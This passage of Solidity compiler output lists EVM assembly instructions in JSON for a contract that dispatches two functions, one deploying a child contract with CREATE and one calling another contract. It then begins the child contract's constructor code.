											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "7379B422"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "AE3EDB65"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "10"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "tag",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8147,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8158,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8135,
											"end": 8158,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8158,
											"name": "PUSH",
											"source": 4,
											"value": "898855ED"
										},
										{
											"begin": 8159,
											"end": 8163,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "14"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "14"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 8135,
											"end": 8164,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7748,
											"end": 8172,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "tag",
											"source": 4,
											"value": "10"
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7269,
											"end": 7292,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 7727,
											"end": 7731,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "tag",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "CREATE",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7712,
											"end": 7732,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7705,
											"end": 7732,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7705,
											"end": 7732,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7202,
											"end": 7740,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "tag",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH #[$]",
											"source": 4,
											"value": "0000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH [$]",
											"source": 4,
											"value": "0000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "CODECOPY",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									],
									".data": {
										"0": {
											".code": [
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH",
													"source": 4,
													"value": "80"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "MSTORE",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "CALLVALUE",
													"source": 4
												},
												{
													"begin": 5,
													"end": 14,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "ISZERO",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "PUSH [tag]",
													"source": -1,
													"value": "1"
												},
												{
													"begin": 2,
													"end": 4,
													"name": "JUMPI",
													"source": -1
												},
												{
													"begin": 27,
													"end": 28,
													"name": "PUSH",
													"source": -1,
													"value": "0"
												},
												{
													"begin": 24,
													"end": 25,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 17,
													"end": 29,
													"name": "REVERT",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "tag",
													"source": -1,
													"value": "1"
												},
												{
													"begin": 2,
													"end": 4,
													"name": "JUMPDEST",
													"source": -1
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "MLOAD",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "PUSHSIZE",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "CODESIZE",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SUB",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "PUSHSIZE",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP4",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "CODECOPY",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "ADD",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "MSTORE",
													"source": 4
												},
												{
													"begin": 15,
													"end": 17,
													"name": "PUSH",
													"source": -1,
													"value": "20"
												},
												{
													"begin": 10,
													"end": 13,
													"name": "DUP2",
													"source": -1
												},
												{
													"begin": 7,
													"end": 18,
													"name": "LT",
													"source": -1
												},
												{
													"begin": 4,
													"end": 6,
													"name": "ISZERO",
													"source": -1
												},
												{
													"begin": 4,
													"end": 6,
													"name": "PUSH [tag]",
													"source": -1,
													"value": "2"
												},
												{
													"begin": 4,
													"end": 6,
													"name": "JUMPI",
													"source": -1
												},
												{
													"begin": 31,
													"end": 32,
													"name": "PUSH",
													"source": -1,
													"value": "0"
												},
												{
													"begin": 28,
													"end": 29,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 21,
													"end": 33,
													"name": "REVERT",
													"source": -1
												},
												{
													"begin": 4,
													"end": 6,
													"name": "tag",
													"source": -1,
													"value": "2"
												},
												{
													"begin": 4,
													"end": 6,
													"name": "JUMPDEST",
													"source": -1
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "ADD",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "MLOAD",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "PUSH",
													"source": 4,
													"value": "20"
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "ADD",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP3",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP2",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 4716,
													"end": 4726,
													"name": "CALLER",
